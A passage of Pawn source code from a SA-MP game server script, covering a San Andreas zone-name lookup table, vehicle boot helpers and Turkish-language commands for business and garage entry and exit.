        {!"Glen Park",                    {1812.60, -1100.80, -89.00, 1994.30, -973.30, 110.90}},
        {!"Glen Park",                    {1812.60, -1350.70, -89.00, 2056.80, -1100.80, 110.90}},
        {!"Green Palms",                  {176.50, 1305.40, -3.00, 338.60, 1520.70, 200.00}},
        {!"Greenglass College",           {964.30, 1044.60, -89.00, 1197.30, 1203.20, 110.90}},
        {!"Greenglass College",           {964.30, 930.80, -89.00, 1166.50, 1044.60, 110.90}},
        {!"Hampton Barns",                {603.00, 264.30, 0.00, 761.90, 366.50, 200.00}},
        {!"Hankypanky Point",             {2576.90, 62.10, 0.00, 2759.20, 385.50, 200.00}},
        {!"Harry Gold Parkway",           {1777.30, 863.20, -89.00, 1817.30, 2342.80, 110.90}},
        {!"Hashbury",                     {-2593.40, -222.50, -0.00, -2411.20, 54.70, 200.00}},
        {!"Hilltop Farm",                 {967.30, -450.30, -3.00, 1176.70, -217.90, 200.00}},
        {!"Hunter Quarry",                {337.20, 710.80, -115.20, 860.50, 1031.70, 203.70}},
        {!"Idlewood",                     {1812.60, -1852.80, -89.00, 1971.60, -1742.30, 110.90}},
        {!"Idlewood",                     {1812.60, -1742.30, -89.00, 1951.60, -1602.30, 110.90}},
        {!"Idlewood",                     {1951.60, -1742.30, -89.00, 2124.60, -1602.30, 110.90}},
        {!"Idlewood",                     {1812.60, -1602.30, -89.00, 2124.60, -1449.60, 110.90}},
        {!"Idlewood",                     {2124.60, -1742.30, -89.00, 2222.50, -1494.00, 110.90}},
        {!"Idlewood",                     {1971.60, -1852.80, -89.00, 2222.50, -1742.30, 110.90}},
        {!"Jefferson",                    {1996.90, -1449.60, -89.00, 2056.80, -1350.70, 110.90}},
        {!"Jefferson",                    {2124.60, -1494.00, -89.00, 2266.20, -1449.60, 110.90}},
        {!"Jefferson",                    {2056.80, -1372.00, -89.00, 2281.40, -1210.70, 110.90}},
        {!"Jefferson",                    {2056.80, -1210.70, -89.00, 2185.30, -1126.30, 110.90}},
        {!"Jefferson",                    {2185.30, -1210.70, -89.00, 2281.40, -1154.50, 110.90}},
        {!"Jefferson",                    {2056.80, -1449.60, -89.00, 2266.20, -1372.00, 110.90}},
        {!"Julius Thruway East",          {2623.10, 943.20, -89.00, 2749.90, 1055.90, 110.90}},
        {!"Julius Thruway East",          {2685.10, 1055.90, -89.00, 2749.90, 2626.50, 110.90}},
        {!"Julius Thruway East",          {2536.40, 2442.50, -89.00, 2685.10, 2542.50, 110.90}},
        {!"Julius Thruway East",          {2625.10, 2202.70, -89.00, 2685.10, 2442.50, 110.90}},
        {!"Julius Thruway North",         {2498.20, 2542.50, -89.00, 2685.10, 2626.50, 110.90}},
        {!"Julius Thruway North",         {2237.40, 2542.50, -89.00, 2498.20, 2663.10, 110.90}},
        {!"Julius Thruway North",         {2121.40, 2508.20, -89.00, 2237.40, 2663.10, 110.90}},
        {!"Julius Thruway North",         {1938.80, 2508.20, -89.00, 2121.40, 2624.20, 110.90}},
        {!"Julius Thruway North",         {1534.50, 2433.20, -89.00, 1848.40, 2583.20, 110.90}},
        {!"Julius Thruway North",         {1848.40, 2478.40, -89.00, 1938.80, 2553.40, 110.90}},
        {!"Julius Thruway North",         {1704.50, 2342.80, -89.00, 1848.40, 2433.20, 110.90}},
        {!"Julius Thruway North",         {1377.30, 2433.20, -89.00, 1534.50, 2507.20, 110.90}},
        {!"Julius Thruway South",         {1457.30, 823.20, -89.00, 2377.30, 863.20, 110.90}},
        {!"Julius Thruway South",         {2377.30, 788.80, -89.00, 2537.30, 897.90, 110.90}},
        {!"Julius Thruway West",          {1197.30, 1163.30, -89.00, 1236.60, 2243.20, 110.90}},
        {!"Julius Thruway West",          {1236.60, 2142.80, -89.00, 1297.40, 2243.20, 110.90}},
        {!"Juniper Hill",                 {-2533.00, 578.30, -7.60, -2274.10, 968.30, 200.00}},
        {!"Juniper Hollow",               {-2533.00, 968.30, -6.10, -2274.10, 1358.90, 200.00}},
        {!"K.A.C.C. Military Fuels",      {2498.20, 2626.50, -89.00, 2749.90, 2861.50, 110.90}},
        {!"Kincaid Bridge",               {-1339.80, 599.20, -89.00, -1213.90, 828.10, 110.90}},
        {!"Kincaid Bridge",               {-1213.90, 721.10, -89.00, -1087.90, 950.00, 110.90}},
        {!"Kincaid Bridge",               {-1087.90, 855.30, -89.00, -961.90, 986.20, 110.90}},
        {!"King's",                       {-2329.30, 458.40, -7.60, -1993.20, 578.30, 200.00}},
        {!"King's",                       {-2411.20, 265.20, -9.10, -1993.20, 373.50, 200.00}},
        {!"King's",                       {-2253.50, 373.50, -9.10, -1993.20, 458.40, 200.00}},
        {!"LVA Freight Depot",            {1457.30, 863.20, -89.00, 1777.40, 1143.20, 110.90}},
        {!"LVA Freight Depot",            {1375.60, 919.40, -89.00, 1457.30, 1203.20, 110.90}},
        {!"LVA Freight Depot",            {1277.00, 1087.60, -89.00, 1375.60, 1203.20, 110.90}},
        {!"LVA Freight Depot",            {1315.30, 1044.60, -89.00, 1375.60, 1087.60, 110.90}},
        {!"LVA Freight Depot",            {1236.60, 1163.40, -89.00, 1277.00, 1203.20, 110.90}},
        {!"Las Barrancas",                {-926.10, 1398.70, -3.00, -719.20, 1634.60, 200.00}},
        {!"Las Brujas",                   {-365.10, 2123.00, -3.00, -208.50, 2217.60, 200.00}},
        {!"Las Colinas",                  {1994.30, -1100.80, -89.00, 2056.80, -920.80, 110.90}},
        {!"Las Colinas",                  {2056.80, -1126.30, -89.00, 2126.80, -920.80, 110.90}},
        {!"Las Colinas",                  {2185.30, -1154.50, -89.00, 2281.40, -934.40, 110.90}},
        {!"Las Colinas",                  {2126.80, -1126.30, -89.00, 2185.30, -934.40, 110.90}},
        {!"Las Colinas",                  {2747.70, -1120.00, -89.00, 2959.30, -945.00, 110.90}},
        {!"Las Colinas",                  {2632.70, -1135.00, -89.00, 2747.70, -945.00, 110.90}},
        {!"Las Colinas",                  {2281.40, -1135.00, -89.00, 2632.70, -945.00, 110.90}},
        {!"Las Payasadas",                {-354.30, 2580.30, 2.00, -133.60, 2816.80, 200.00}},
        {!"Las Venturas Airport",         {1236.60, 1203.20, -89.00, 1457.30, 1883.10, 110.90}},
        {!"Las Venturas Airport",         {1457.30, 1203.20, -89.00, 1777.30, 1883.10, 110.90}},
        {!"Las Venturas Airport",         {1457.30, 1143.20, -89.00, 1777.40, 1203.20, 110.90}},
        {!"Las Venturas Airport",         {1515.80, 1586.40, -12.50, 1729.90, 1714.50, 87.50}},
        {!"Last Dime Motel",              {1823.00, 596.30, -89.00, 1997.20, 823.20, 110.90}},
        {!"Leafy Hollow",                 {-1166.90, -1856.00, 0.00, -815.60, -1602.00, 200.00}},
        {!"Liberty City",                 {-1000.00, 400.00, 1300.00, -700.00, 600.00, 1400.00}},
        {!"Lil' Probe Inn",               {-90.20, 1286.80, -3.00, 153.80, 1554.10, 200.00}},
        {!"Linden Side",                  {2749.90, 943.20, -89.00, 2923.30, 1198.90, 110.90}},
        {!"Linden Station",               {2749.90, 1198.90, -89.00, 2923.30, 1548.90, 110.90}},
        {!"Linden Station",               {2811.20, 1229.50, -39.50, 2861.20, 1407.50, 60.40}},
        {!"Little Mexico",                {1701.90, -1842.20, -89.00, 1812.60, -1722.20, 110.90}},
        {!"Little Mexico",                {1758.90, -1722.20, -89.00, 1812.60, -1577.50, 110.90}},
        {!"Los Flores",                   {2581.70, -1454.30, -89.00, 2632.80, -1393.40, 110.90}},
        {!"Los Flores",                   {2581.70, -1393.40, -89.00, 2747.70, -1135.00, 110.90}},
        {!"Los Santos International",     {1249.60, -2394.30, -89.00, 1852.00, -2179.20, 110.90}},
        {!"Los Santos International",     {1852.00, -2394.30, -89.00, 2089.00, -2179.20, 110.90}},
        {!"Los Santos International",     {1382.70, -2730.80, -89.00, 2201.80, -2394.30, 110.90}},
        {!"Los Santos International",     {1974.60, -2394.30, -39.00, 2089.00, -2256.50, 60.90}},
        {!"Los Santos International",     {1400.90, -2669.20, -39.00, 2189.80, -2597.20, 60.90}},
        {!"Los Santos International",     {2051.60, -2597.20, -39.00, 2152.40, -2394.30, 60.90}},
        {!"Marina",                       {647.70, -1804.20, -89.00, 851.40, -1577.50, 110.90}},
        {!"Marina",                       {647.70, -1577.50, -89.00, 807.90, -1416.20, 110.90}},
        {!"Marina",                       {807.90, -1577.50, -89.00, 926.90, -1416.20, 110.90}},
        {!"Market",                       {787.40, -1416.20, -89.00, 1072.60, -1310.20, 110.90}},
        {!"Market",                       {952.60, -1310.20, -89.00, 1072.60, -1130.80, 110.90}},
        {!"Market",                       {1072.60, -1416.20, -89.00, 1370.80, -1130.80, 110.90}},
        {!"Market",                       {926.90, -1577.50, -89.00, 1370.80, -1416.20, 110.90}},
        {!"Market Station",               {787.40, -1410.90, -34.10, 866.00, -1310.20, 65.80}},
        {!"Martin Bridge",                {-222.10, 293.30, 0.00, -122.10, 476.40, 200.00}},
        {!"Missionary Hill",              {-2994.40, -811.20, 0.00, -2178.60, -430.20, 200.00}},
        {!"Montgomery",                   {1119.50, 119.50, -3.00, 1451.40, 493.30, 200.00}},
        {!"Montgomery",                   {1451.40, 347.40, -6.10, 1582.40, 420.80, 200.00}},
        {!"Montgomery Intersection",      {1546.60, 208.10, 0.00, 1745.80, 347.40, 200.00}},
        {!"Montgomery Intersection",      {1582.40, 347.40, 0.00, 1664.60, 401.70, 200.00}},
        {!"Mulholland",                   {1414.00, -768.00, -89.00, 1667.60, -452.40, 110.90}},
        {!"Mulholland",                   {1281.10, -452.40, -89.00, 1641.10, -290.90, 110.90}},
        {!"Mulholland",                   {1269.10, -768.00, -89.00, 1414.00, -452.40, 110.90}},
        {!"Mulholland",                   {1357.00, -926.90, -89.00, 1463.90, -768.00, 110.90}},
        {!"Mulholland",                   {1318.10, -910.10, -89.00, 1357.00, -768.00, 110.90}},
        {!"Mulholland",                   {1169.10, -910.10, -89.00, 1318.10, -768.00, 110.90}},
        {!"Mulholland",                   {768.60, -954.60, -89.00, 952.60, -860.60, 110.90}},
        {!"Mulholland",                   {687.80, -860.60, -89.00, 911.80, -768.00, 110.90}},
        {!"Mulholland",                   {737.50, -768.00, -89.00, 1142.20, -674.80, 110.90}},
        {!"Mulholland",                   {1096.40, -910.10, -89.00, 1169.10, -768.00, 110.90}},
        {!"Mulholland",                   {952.60, -937.10, -89.00, 1096.40, -860.60, 110.90}},
        {!"Mulholland",                   {911.80, -860.60, -89.00, 1096.40, -768.00, 110.90}},
        {!"Mulholland",                   {861.00, -674.80, -89.00, 1156.50, -600.80, 110.90}},
        {!"Mulholland Intersection",      {1463.90, -1150.80, -89.00, 1812.60, -768.00, 110.90}},
        {!"North Rock",                   {2285.30, -768.00, 0.00, 2770.50, -269.70, 200.00}},
        {!"Ocean Docks",                  {2373.70, -2697.00, -89.00, 2809.20, -2330.40, 110.90}},
        {!"Ocean Docks",                  {2201.80, -2418.30, -89.00, 2324.00, -2095.00, 110.90}},
        {!"Ocean Docks",                  {2324.00, -2302.30, -89.00, 2703.50, -2145.10, 110.90}},
        {!"Ocean Docks",                  {2089.00, -2394.30, -89.00, 2201.80, -2235.80, 110.90}},
        {!"Ocean Docks",                  {2201.80, -2730.80, -89.00, 2324.00, -2418.30, 110.90}},
        {!"Ocean Docks",                  {2703.50, -2302.30, -89.00, 2959.30, -2126.90, 110.90}},
        {!"Ocean Docks",                  {2324.00, -2145.10, -89.00, 2703.50, -2059.20, 110.90}},
        {!"Ocean Flats",                  {-2994.40, 277.40, -9.10, -2867.80, 458.40, 200.00}},
        {!"Ocean Flats",                  {-2994.40, -222.50, -0.00, -2593.40, 277.40, 200.00}},
        {!"Ocean Flats",                  {-2994.40, -430.20, -0.00, -2831.80, -222.50, 200.00}},
        {!"Octane Springs",               {338.60, 1228.50, 0.00, 664.30, 1655.00, 200.00}},
        {!"Old Venturas Strip",           {2162.30, 2012.10, -89.00, 2685.10, 2202.70, 110.90}},
        {!"Palisades",                    {-2994.40, 458.40, -6.10, -2741.00, 1339.60, 200.00}},
        {!"Palomino Creek",               {2160.20, -149.00, 0.00, 2576.90, 228.30, 200.00}},
        {!"Paradiso",                     {-2741.00, 793.40, -6.10, -2533.00, 1268.40, 200.00}},
        {!"Pershing Square",              {1440.90, -1722.20, -89.00, 1583.50, -1577.50, 110.90}},
        {!"Pilgrim",                      {2437.30, 1383.20, -89.00, 2624.40, 1783.20, 110.90}},
        {!"Pilgrim",                      {2624.40, 1383.20, -89.00, 2685.10, 1783.20, 110.90}},
        {!"Pilson Intersection",          {1098.30, 2243.20, -89.00, 1377.30, 2507.20, 110.90}},
        {!"Pirates in Men's Pants",       {1817.30, 1469.20, -89.00, 2027.40, 1703.20, 110.90}},
        {!"Playa del Seville",            {2703.50, -2126.90, -89.00, 2959.30, -1852.80, 110.90}},
        {!"Prickle Pine",                 {1534.50, 2583.20, -89.00, 1848.40, 2863.20, 110.90}},
        {!"Prickle Pine",                 {1117.40, 2507.20, -89.00, 1534.50, 2723.20, 110.90}},
        {!"Prickle Pine",                 {1848.40, 2553.40, -89.00, 1938.80, 2863.20, 110.90}},
        {!"Prickle Pine",                 {1938.80, 2624.20, -89.00, 2121.40, 2861.50, 110.90}},
        {!"Queens",                       {-2533.00, 458.40, 0.00, -2329.30, 578.30, 200.00}},
        {!"Queens",                       {-2593.40, 54.70, 0.00, -2411.20, 458.40, 200.00}},
        {!"Queens",                       {-2411.20, 373.50, 0.00, -2253.50, 458.40, 200.00}},
        {!"Randolph Industrial Estate",   {1558.00, 596.30, -89.00, 1823.00, 823.20, 110.90}},
        {!"Redsands East",                {1817.30, 2011.80, -89.00, 2106.70, 2202.70, 110.90}},
        {!"Redsands East",                {1817.30, 2202.70, -89.00, 2011.90, 2342.80, 110.90}},
        {!"Redsands East",                {1848.40, 2342.80, -89.00, 2011.90, 2478.40, 110.90}},
        {!"Redsands West",                {1236.60, 1883.10, -89.00, 1777.30, 2142.80, 110.90}},
        {!"Redsands West",                {1297.40, 2142.80, -89.00, 1777.30, 2243.20, 110.90}},
        {!"Redsands West",                {1377.30, 2243.20, -89.00, 1704.50, 2433.20, 110.90}},
        {!"Redsands West",                {1704.50, 2243.20, -89.00, 1777.30, 2342.80, 110.90}},
        {!"Regular Tom",                  {-405.70, 1712.80, -3.00, -276.70, 1892.70, 200.00}},
        {!"Richman",                      {647.50, -1118.20, -89.00, 787.40, -954.60, 110.90}},
        {!"Richman",                      {647.50, -954.60, -89.00, 768.60, -860.60, 110.90}},
        {!"Richman",                      {225.10, -1369.60, -89.00, 334.50, -1292.00, 110.90}},
        {!"Richman",                      {225.10, -1292.00, -89.00, 466.20, -1235.00, 110.90}},
        {!"Richman",                      {72.60, -1404.90, -89.00, 225.10, -1235.00, 110.90}},
        {!"Richman",                      {72.60, -1235.00, -89.00, 321.30, -1008.10, 110.90}},
        {!"Richman",                      {321.30, -1235.00, -89.00, 647.50, -1044.00, 110.90}},
        {!"Richman",                      {321.30, -1044.00, -89.00, 647.50, -860.60, 110.90}},
        {!"Richman",                      {321.30, -860.60, -89.00, 687.80, -768.00, 110.90}},
        {!"Richman",                      {321.30, -768.00, -89.00, 700.70, -674.80, 110.90}},
        {!"Robada Intersection",          {-1119.00, 1178.90, -89.00, -862.00, 1351.40, 110.90}},
        {!"Roca Escalante",               {2237.40, 2202.70, -89.00, 2536.40, 2542.50, 110.90}},
        {!"Roca Escalante",               {2536.40, 2202.70, -89.00, 2625.10, 2442.50, 110.90}},
        {!"Rockshore East",               {2537.30, 676.50, -89.00, 2902.30, 943.20, 110.90}},
        {!"Rockshore West",               {1997.20, 596.30, -89.00, 2377.30, 823.20, 110.90}},
        {!"Rockshore West",               {2377.30, 596.30, -89.00, 2537.30, 788.80, 110.90}},
        {!"Rodeo",                        {72.60, -1684.60, -89.00, 225.10, -1544.10, 110.90}},
        {!"Rodeo",                        {72.60, -1544.10, -89.00, 225.10, -1404.90, 110.90}},
        {!"Rodeo",                        {225.10, -1684.60, -89.00, 312.80, -1501.90, 110.90}},
        {!"Rodeo",                        {225.10, -1501.90, -89.00, 334.50, -1369.60, 110.90}},
        {!"Rodeo",                        {334.50, -1501.90, -89.00, 422.60, -1406.00, 110.90}},
        {!"Rodeo",                        {312.80, -1684.60, -89.00, 422.60, -1501.90, 110.90}},
        {!"Rodeo",                        {422.60, -1684.60, -89.00, 558.00, -1570.20, 110.90}},
        {!"Rodeo",                        {558.00, -1684.60, -89.00, 647.50, -1384.90, 110.90}},
        {!"Rodeo",                        {466.20, -1570.20, -89.00, 558.00, -1385.00, 110.90}},
        {!"Rodeo",                        {422.60, -1570.20, -89.00, 466.20, -1406.00, 110.90}},
        {!"Rodeo",                        {466.20, -1385.00, -89.00, 647.50, -1235.00, 110.90}},
        {!"Rodeo",                        {334.50, -1406.00, -89.00, 466.20, -1292.00, 110.90}},
        {!"Royal Casino",                 {2087.30, 1383.20, -89.00, 2437.30, 1543.20, 110.90}},
        {!"San Andreas Sound",            {2450.30, 385.50, -100.00, 2759.20, 562.30, 200.00}},
        {!"Santa Flora",                  {-2741.00, 458.40, -7.60, -2533.00, 793.40, 200.00}},
        {!"Santa Maria Beach",            {342.60, -2173.20, -89.00, 647.70, -1684.60, 110.90}},
        {!"Santa Maria Beach",            {72.60, -2173.20, -89.00, 342.60, -1684.60, 110.90}},
        {!"Shady Cabin",                  {-1632.80, -2263.40, -3.00, -1601.30, -2231.70, 200.00}},
        {!"Shady Creeks",                 {-1820.60, -2643.60, -8.00, -1226.70, -1771.60, 200.00}},
        {!"Shady Creeks",                 {-2030.10, -2174.80, -6.10, -1820.60, -1771.60, 200.00}},
        {!"Sobell Rail Yards",            {2749.90, 1548.90, -89.00, 2923.30, 1937.20, 110.90}},
        {!"Spinybed",                     {2121.40, 2663.10, -89.00, 2498.20, 2861.50, 110.90}},
        {!"Starfish Casino",              {2437.30, 1783.20, -89.00, 2685.10, 2012.10, 110.90}},
        {!"Starfish Casino",              {2437.30, 1858.10, -39.00, 2495.00, 1970.80, 60.90}},
        {!"Starfish Casino",              {2162.30, 1883.20, -89.00, 2437.30, 2012.10, 110.90}},
        {!"Temple",                       {1252.30, -1130.80, -89.00, 1378.30, -1026.30, 110.90}},
        {!"Temple",                       {1252.30, -1026.30, -89.00, 1391.00, -926.90, 110.90}},
        {!"Temple",                       {1252.30, -926.90, -89.00, 1357.00, -910.10, 110.90}},
        {!"Temple",                       {952.60, -1130.80, -89.00, 1096.40, -937.10, 110.90}},
        {!"Temple",                       {1096.40, -1130.80, -89.00, 1252.30, -1026.30, 110.90}},
        {!"Temple",                       {1096.40, -1026.30, -89.00, 1252.30, -910.10, 110.90}},
        {!"The Camel's Toe",              {2087.30, 1203.20, -89.00, 2640.40, 1383.20, 110.90}},
        {!"The Clown's Pocket",           {2162.30, 1783.20, -89.00, 2437.30, 1883.20, 110.90}},
        {!"The Emerald Isle",             {2011.90, 2202.70, -89.00, 2237.40, 2508.20, 110.90}},
        {!"The Farm",                     {-1209.60, -1317.10, 114.90, -908.10, -787.30, 251.90}},
        {!"The Four Dragons Casino",      {1817.30, 863.20, -89.00, 2027.30, 1083.20, 110.90}},
        {!"The High Roller",              {1817.30, 1283.20, -89.00, 2027.30, 1469.20, 110.90}},
        {!"The Mako Span",                {1664.60, 401.70, 0.00, 1785.10, 567.20, 200.00}},
        {!"The Panopticon",               {-947.90, -304.30, -1.10, -319.60, 327.00, 200.00}},
        {!"The Pink Swan",                {1817.30, 1083.20, -89.00, 2027.30, 1283.20, 110.90}},
        {!"The Sherman Dam",              {-968.70, 1929.40, -3.00, -481.10, 2155.20, 200.00}},
        {!"The Strip",                    {2027.40, 863.20, -89.00, 2087.30, 1703.20, 110.90}},
        {!"The Strip",                    {2106.70, 1863.20, -89.00, 2162.30, 2202.70, 110.90}},
        {!"The Strip",                    {2027.40, 1783.20, -89.00, 2162.30, 1863.20, 110.90}},
        {!"The Strip",                    {2027.40, 1703.20, -89.00, 2137.40, 1783.20, 110.90}},
        {!"The Visage",                   {1817.30, 1863.20, -89.00, 2106.70, 2011.80, 110.90}},
        {!"The Visage",                   {1817.30, 1703.20, -89.00, 2027.40, 1863.20, 110.90}},
        {!"Unity Station",                {1692.60, -1971.80, -20.40, 1812.60, -1932.80, 79.50}},
        {!"Valle Ocultado",               {-936.60, 2611.40, 2.00, -715.90, 2847.90, 200.00}},
        {!"Verdant Bluffs",               {930.20, -2488.40, -89.00, 1249.60, -2006.70, 110.90}},
        {!"Verdant Bluffs",               {1073.20, -2006.70, -89.00, 1249.60, -1842.20, 110.90}},
        {!"Verdant Bluffs",               {1249.60, -2179.20, -89.00, 1692.60, -1842.20, 110.90}},
        {!"Verdant Meadows",              {37.00, 2337.10, -3.00, 435.90, 2677.90, 200.00}},
        {!"Verona Beach",                 {647.70, -2173.20, -89.00, 930.20, -1804.20, 110.90}},
        {!"Verona Beach",                 {930.20, -2006.70, -89.00, 1073.20, -1804.20, 110.90}},
        {!"Verona Beach",                 {851.40, -1804.20, -89.00, 1046.10, -1577.50, 110.90}},
        {!"Verona Beach",                 {1161.50, -1722.20, -89.00, 1323.90, -1577.50, 110.90}},
        {!"Verona Beach",                 {1046.10, -1722.20, -89.00, 1161.50, -1577.50, 110.90}},
        {!"Vinewood",                     {787.40, -1310.20, -89.00, 952.60, -1130.80, 110.90}},
        {!"Vinewood",                     {787.40, -1130.80, -89.00, 952.60, -954.60, 110.90}},
        {!"Vinewood",                     {647.50, -1227.20, -89.00, 787.40, -1118.20, 110.90}},
        {!"Vinewood",                     {647.70, -1416.20, -89.00, 787.40, -1227.20, 110.90}},
        {!"Whitewood Estates",            {883.30, 1726.20, -89.00, 1098.30, 2507.20, 110.90}},
        {!"Whitewood Estates",            {1098.30, 1726.20, -89.00, 1197.30, 2243.20, 110.90}},
        {!"Willowfield",                  {1970.60, -2179.20, -89.00, 2089.00, -1852.80, 110.90}},
        {!"Willowfield",                  {2089.00, -2235.80, -89.00, 2201.80, -1989.90, 110.90}},
        {!"Willowfield",                  {2089.00, -1989.90, -89.00, 2324.00, -1852.80, 110.90}},
        {!"Willowfield",                  {2201.80, -2095.00, -89.00, 2324.00, -1989.90, 110.90}},
        {!"Willowfield",                  {2541.70, -1941.40, -89.00, 2703.50, -1852.80, 110.90}},
        {!"Willowfield",                  {2324.00, -2059.20, -89.00, 2541.70, -1852.80, 110.90}},
        {!"Willowfield",                  {2541.70, -2059.20, -89.00, 2703.50, -1941.40, 110.90}},
        {!"Yellow Bell Station",          {1377.40, 2600.40, -21.90, 1492.40, 2687.30, 78.00}},
        {!"Los Santos",                   {44.60, -2892.90, -242.90, 2997.00, -768.00, 900.00}},
        {!"Las Venturas",                 {869.40, 596.30, -242.90, 2997.00, 2993.80, 900.00}},
        {!"Bone County",                  {-480.50, 596.30, -242.90, 869.40, 2993.80, 900.00}},
        {!"Tierra Robada",                {-2997.40, 1659.60, -242.90, -480.50, 2993.80, 900.00}},
        {!"Tierra Robada",                {-1213.90, 596.30, -242.90, -480.50, 1659.60, 900.00}},
        {!"San Fierro",                   {-2997.40, -1115.50, -242.90, -1213.90, 1659.60, 900.00}},
        {!"Red County",                   {-1213.90, -768.00, -242.90, 2997.00, 596.30, 900.00}},
        {!"Flint County",                 {-1213.90, -2892.90, -242.90, 44.60, -768.00, 900.00}},
        {!"Whetstone",                    {-2997.40, -2892.90, -242.90, -1213.90, -1115.50, 900.00}}
    };
    new
        name[32] = "San Andreas";

    for (new i = 0; i != sizeof(g_arrZoneData); i ++) if ((fX >= g_arrZoneData[i][e_ZoneArea][0] && fX <= g_arrZoneData[i][e_ZoneArea][3]) && (fY >= g_arrZoneData[i][e_ZoneArea][1] && fY <= g_arrZoneData[i][e_ZoneArea][4]) && (fZ >= g_arrZoneData[i][e_ZoneArea][2] && fZ <= g_arrZoneData[i][e_ZoneArea][5])) {
        strunpack(name, g_arrZoneData[i][e_ZoneName]);

        break;
    }
    return name;
}
GetVehicleBoot(vehicleid, &Float:x, &Float:y, &Float:z)
{
    if (!GetVehicleModel(vehicleid) || vehicleid == INVALID_VEHICLE_ID)
        return (x = 0.0, y = 0.0, z = 0.0), 0;

    static
        Float:pos[7]
    ;
    GetVehicleModelInfo(GetVehicleModel(vehicleid), VEHICLE_MODEL_INFO_SIZE, pos[0], pos[1], pos[2]);
    GetVehiclePos(vehicleid, pos[3], pos[4], pos[5]);
    GetVehicleZAngle(vehicleid, pos[6]);

    x = pos[3] - (floatsqroot(pos[1] + pos[1]) * floatsin(-pos[6], degrees));
    y = pos[4] - (floatsqroot(pos[1] + pos[1]) * floatcos(-pos[6], degrees));
	z = pos[5];
    return 1;
}
stock GetTrunkStatus(vehicleid)
{
    static
        engine,
        lights,
        alarm,
        doors,
        bonnet,
        boot,
        objective;

    GetVehicleParamsEx(vehicleid, engine, lights, alarm, doors, bonnet, boot, objective);

    if (boot != 1)
        return 0;

    return 1;
}

CMD:igarajduzenle(playerid, params[])
{
    if(!Girdi[playerid] || !AKontrol(playerid) || Karakter[playerid][adminlevel] < 5) return 1;
    new isyid,_tip;
    if(sscanf(params,"dd",isyid,_tip)) return Kullanim(playerid, "/igarajduzenle [iþyeriID] [1-2]"),SendClientMessage(playerid, -1, ""C3"1:Giriþ-2:Çýkýþ");
    if(!IsPlayerInAnyVehicle(playerid)) return Hata(playerid, "Herhangi bir aracýn içinde deðilsiniz.");
    if(_tip != 1 && _tip != 2) return Kullanim(playerid, "/igarajduzenle [iþyeriID] [1-2]"),SendClientMessage(playerid, -1, ""C3"1:Giriþ-2:Çýkýþ");
    if(_tip == 1)
    {
        new Float:vPos[4];
        GetVehiclePos(GetPlayerVehicleID(playerid), vPos[0], vPos[1], vPos[2]);
        GetVehicleZAngle(GetPlayerVehicleID(playerid), vPos[3]);
        Isyeri[isyid][agirisx] = vPos[0];
        Isyeri[isyid][agirisy] = vPos[1];
        Isyeri[isyid][agirisz] = vPos[2];
        Isyeri[isyid][agirisang] = vPos[3];
        new mstring[128];
        format(mstring, sizeof(mstring), "%d idli iþyerinin garaj giriþini ayarladýnýz.",isyid);
        Bilgi(playerid,mstring);
    }
    else
    {
        new Float:vPos[4];
        GetVehiclePos(GetPlayerVehicleID(playerid), vPos[0], vPos[1], vPos[2]);
        GetVehicleZAngle(GetPlayerVehicleID(playerid), vPos[3]);
        Isyeri[isyid][acikisx] = vPos[0];
        Isyeri[isyid][acikisy] = vPos[1];
        Isyeri[isyid][acikisz] = vPos[2];
        Isyeri[isyid][acikisang] = vPos[3];
        new mstring[128];
        format(mstring, sizeof(mstring), "%d idli iþyerinin garaj çýkýþýný ayarladýnýz.",isyid);
        Bilgi(playerid,mstring);
    }
    IsyeriKaydet(isyid);
	return 1;
}

CMD:igaraj(playerid, params[])
{
    if(!Girdi[playerid]) return 1;
    foreach(new i : Business)
	{
	    if(IsPlayerInRangeOfPoint(playerid, 5.0, Isyeri[i][agirisx], Isyeri[i][agirisy], Isyeri[i][agirisz]) && GetPlayerVirtualWorld(playerid) == 0 && GetPlayerInterior(playerid) == 0)
	    {
	        if(Isyeri[i][ikilit]) return Hata(playerid, "Ýþyeri kilitli.");
	        if(Isyeri[i][muhur]) return Hata(playerid, "Ýþyeri mühürlü.");
	        if(Isyeri[i][ivergi] >= Isyeri[i][ifiyat]*35/100) return Hata(playerid, "Bu iþyeri vergi kilidinde.");
	        if(IsPlayerInAnyVehicle(playerid))
	        {
	        	IsyeriGarajGonder(playerid, i, 1);
			}
			else
			{
			    DONDUR(playerid);
	        	SetTimerEx("UnfreezeTimer", 5000, false, "u", playerid);
			    SetPlayerPos(playerid, Isyeri[i][acikisx], Isyeri[i][acikisy], Isyeri[i][acikisz]);
			    SetPlayerVirtualWorld(playerid, i);
			    SetPlayerInterior(playerid, 1);
			}
			return 1;
	    }
	    if(IsPlayerInRangeOfPoint(playerid, 5.0, Isyeri[i][acikisx], Isyeri[i][acikisy], Isyeri[i][acikisz]) && GetPlayerVirtualWorld(playerid) == i && GetPlayerInterior(playerid) == 1)
	    {
	        if(Isyeri[i][ikilit]) return Hata(playerid, "Ýþyeri kilitli.");
	        if(Isyeri[i][muhur]) return Hata(playerid, "Ýþyeri mühürlü.");
	        if(Isyeri[i][ivergi] >= Isyeri[i][ifiyat]*35/100) return Hata(playerid, "Bu iþyeri vergi kilidinde.");
	        if(IsPlayerInAnyVehicle(playerid))
	        {
	        	IsyeriGarajGonder(playerid, i, 2);
			}
			else
			{
			    DONDUR(playerid);
	        	SetTimerEx("UnfreezeTimer", 5000, false, "u", playerid);
			    SetPlayerPos(playerid, Isyeri[i][agirisx], Isyeri[i][agirisy], Isyeri[i][agirisz]);
			    SetPlayerVirtualWorld(playerid, 0);
			    SetPlayerInterior(playerid, 0);
			}
			return 1;
	    }
	}
	Hata(playerid, "Herhangi bir garajýn yakýnýnda deðilsiniz.");
	return 1;
}

CMD:garaj(playerid, params[])
{
	if(!Girdi[playerid]) return 1;
	new nstring[16];
	if(sscanf(params,"s[16]",nstring)) return Kullanim(playerid, "/garaj [fonksiyon]"),SendClientMessage(playerid, -1, "Geçerli fonksiyonlar: gir, cik, kilit");
	if(Buysa("gir",nstring))
	{
		new id=-1;
		for(new i; i<MAX_GARAJ;i++)
		{
		    if(IsValidDynamicPickup(Garaj[i][gpickup]))
		    {
		        if(IsPlayerInRangeOfPoint(playerid, 5, Garaj[i][gx], Garaj[i][gy], Garaj[i][gz]) && GetPlayerVirtualWorld(playerid) == Garaj[i][gvw])
		        {
					id=i;
					break;
		        }
			}
		}
		if(id==-1) return Hata(playerid, "Garajýn yakýnýnda deðilsiniz.");
		if(Garaj[id][gkilit]) return Hata(playerid, "Garaj kilitli.");
		if(!Garaj[id][gicint]) return Hata(playerid, "Bu garajýn interioru ayarlanmamýþ.");
